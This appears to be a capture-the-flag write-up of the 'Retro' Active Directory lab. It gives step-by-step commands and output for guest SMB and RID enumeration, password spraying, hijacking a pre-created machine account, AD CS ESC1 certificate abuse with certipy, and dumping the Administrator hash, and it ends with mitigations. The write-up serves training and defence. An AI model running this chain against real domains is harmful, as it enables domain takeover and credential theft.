---
layout: default
title: "Retro — Pre-created Machine Account to AD CS ESC1"
date: 2026-10-05
author: 0xcybersoldier
tags: [active-directory, adcs, esc1, pre-created-computer-account, rid-brute, certipy, writeup]
---

# Retro — Pre-created Machine Account to AD CS ESC1

<p align="center">
  <img src="{{ '/assets/img/retro.png' | relative_url }}" alt="Retro" width="260">
</p>

**Difficulty:** Easy · **OS:** Windows Server 2022 · **Domain:** `retro.vl`

Retro is an Active Directory box that chains several classic misconfigurations:
anonymous/guest SMB access, a shared `trainee:trainee` account, an abandoned
**pre-created (pre-Windows 2000) machine account** whose password equals its name,
and finally an **AD CS ESC1** certificate template that lets any domain computer
impersonate the Administrator and take the domain.

---

## 1. Recon

```bash
sudo nmap -sCV --min-rate=1000 -T5 -p- 10.129.234.44 -vvvv
```

The port set is a textbook Domain Controller:

| Port | Service |
|------|---------|
| 53 | DNS (Simple DNS Plus) |
| 88 | Kerberos |
| 135 / 139 / 445 | RPC / NetBIOS / SMB |
| 389 / 636 / 3268 / 3269 | LDAP / LDAPS / Global Catalog |
| 464 | kpasswd |
| 593 | RPC over HTTP |
| 3389 | RDP |
| 9389 | AD Web Services |

From the LDAP/RDP certificates we recover the naming and spot AD CS:

- **Domain:** `retro.vl`
- **DC / host:** `DC.retro.vl`
- **CA:** `retro-DC-CA`  ← AD CS is installed

```bash
echo "10.129.234.44 DC.retro.vl retro.vl" | sudo tee -a /etc/hosts
```

---

## 2. SMB enumeration as guest

The **guest** account is enabled and can list shares:

```bash
nxc smb 10.129.234.44 -u 'guest' -p '' --shares
```

```
Share       Permissions   Remark
-----       -----------   ------
ADMIN$                    Remote Admin
C$                        Default share
IPC$        READ          Remote IPC
NETLOGON                  Logon server share
Notes
SYSVOL                    Logon server share
Trainees    READ
```

`Trainees` is readable. It holds a single `Important.txt`:

```bash
smbclient -U guest //10.129.234.44/Trainees
# smb: \> get Important.txt
```

```
Dear Trainees,
I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.
Regards
```

So there's a single shared "trainee" account — we just need its name.

---

## 3. RID brute-forcing for usernames

Guest access is enough to RID-brute the domain and enumerate users:

```bash
nxc smb 10.129.234.44 -u 'guest' -p '' --rid-brute
```

```
500: RETRO\Administrator   (SidTypeUser)
1104: RETRO\trainee        (SidTypeUser)
1106: RETRO\BANKING$       (SidTypeUser)   <- a machine account
1107: RETRO\jburley        (SidTypeUser)
1109: RETRO\tblack         (SidTypeUser)
```

Collect the user accounts into `users.txt`:

```
Administrator
Guest
krbtgt
DC$
trainee
BANKING$
jburley
tblack
```

---

## 4. Shared credentials — trainee:trainee

Per the `Important.txt` hint, spray username-as-password across the list:

```bash
nxc smb 10.129.234.44 -u users.txt -p users.txt
```

```
[+] retro.vl\trainee:trainee
```

The `trainee` account uses `trainee` as its password. It can now read the **Notes**
share:

```bash
smbclient -U trainee //10.129.234.44/Notes
# smb: \> get ToDo.txt
# smb: \> get user.txt
```

`user.txt` is right there in the share. `ToDo.txt` leaks the next step:

> The old pre-created machine account from the finance department — i.e. the
> **`BANKING$`** account found during RID brute-forcing.

---

## 5. Abusing the pre-created machine account (BANKING$)

When a computer account is created with **"Assign this computer account as a
pre-Windows 2000 computer"**, its password is set to the account name in
**lowercase**. If the machine has never authenticated to the domain, that password
can still be changed.

Trying to log in confirms it — we get `NT_STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`
(not `LOGON_FAILURE`), meaning the credentials are valid but it's a machine account:

```bash
smbclient -U 'Banking$' //10.129.234.44/Notes
# session setup failed: NT_STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

Set a new password for it with Impacket's `changepasswd.py`:

```bash
impacket-changepasswd 10.129.234.44/'banking$':banking@10.129.234.44 \
    -newpass 'P@ssw0rd' -protocol rpc-samr
# [*] Password was changed successfully.

nxc smb 10.129.234.44 -u 'Banking$' -p 'P@ssw0rd'
# [+] retro.vl\Banking$:P@ssw0rd
```

---

## 6. AD CS — finding the ESC1 template

With valid domain credentials we enumerate AD CS:

```bash
nxc ldap 10.129.234.44 -u 'Banking$' -p 'P@ssw0rd' -M adcs
# Found PKI Enrollment Server: DC.retro.vl
# Found CN: retro-DC-CA

certipy-ad find -u 'banking$' -p 'P@ssw0rd' -dc-ip 10.129.234.44 -vulnerable -stdout
```

```
Template Name              : RetroClients
Client Authentication      : True
Enrollee Supplies Subject  : True
Enrollment Rights          : RETRO.VL\Domain Admins
                             RETRO.VL\Domain Computers
                             RETRO.VL\Enterprise Admins
[!] Vulnerabilities
    ESC1 : Enrollee supplies subject and template allows client authentication.
```

The `RetroClients` template is **ESC1**, and **Domain Computers** (which `BANKING$`
belongs to) can enroll. That means we can request a cert as *any* user, including
the Administrator.

---

## 7. Requesting a certificate as Administrator

Request a cert for `Administrator`, embedding the RID-500 SID so it survives strong
certificate mapping:

```bash
certipy-ad req -u 'banking$' -p 'P@ssw0rd' -dc-ip 10.129.234.44 \
    -ca retro-DC-CA -template RetroClients -upn Administrator \
    -target dc.retro.vl -key-size 4096 \
    -sid S-1-5-21-2983547755-698260136-4283918172-500
# [*] Wrote certificate and private key to 'administrator.pfx'
```

> **Note:** a `KRB_AP_ERR_SKEW` here just means your clock is off — run
> `sudo ntpdate retro.vl` to sync with the DC.

---

## 8. From certificate to Domain Admin (root.txt)

Authenticate with the PFX. In this run Kerberos PKINIT errored, so we fall back to
the **LDAP shell** (Schannel) and reset the Administrator password directly:

```bash
certipy-ad auth -pfx 'administrator.pfx' -dc-ip 10.129.234.44 -ldap-shell
# [*] Authenticated to '10.129.234.44' as: 'u:RETRO\Administrator'
# change_password administrator P@ssw0rd@123
# Password changed successfully!
```

Now dump the Administrator hash (or just use the new password) and log in:

```bash
impacket-secretsdump 'retro.vl/administrator:P@ssw0rd@123@10.129.234.44' \
    -just-dc-user administrator
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:68ae965c9062b389f2a285e27ff0a566:::

evil-winrm -i 10.129.234.44 -u Administrator -p 'P@ssw0rd@123'
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
```

Owned. :triangular_flag_on_post:

---

## Attack chain summary

1. **Recon** → DC `retro.vl`, AD CS installed (`retro-DC-CA`).
2. **Guest SMB** → `Trainees` share → "one shared account" hint.
3. **RID brute** → users incl. `trainee` and the `BANKING$` machine account.
4. **Password spray** user=pass → `trainee:trainee` → `Notes` share → `user.txt`.
5. **ToDo.txt** points at the pre-created `BANKING$` account.
6. **Pre-created machine account** → `changepasswd.py` sets a known password.
7. **certipy find** → **ESC1** on `RetroClients` (Domain Computers can enroll).
8. **certipy req** impersonating Administrator → LDAP-shell password reset →
   **secretsdump / evil-winrm** → Domain Admin + `root.txt`.

## Mitigations

- Don't leave **pre-created machine accounts** unused — their predictable lowercase
  password is trivially abused. Remove or properly provision them.
- Disable or restrict the **guest** account and anonymous SMB enumeration.
- Never store a shared password scheme like `trainee:trainee`; enforce unique,
  strong credentials.
- Harden AD CS: remove **Enrollee Supplies Subject** from client-auth templates,
  restrict enrollment rights, and enable **Manager Approval** (the ESC1 fix).
- Enforce strong certificate mapping (KB5014754).
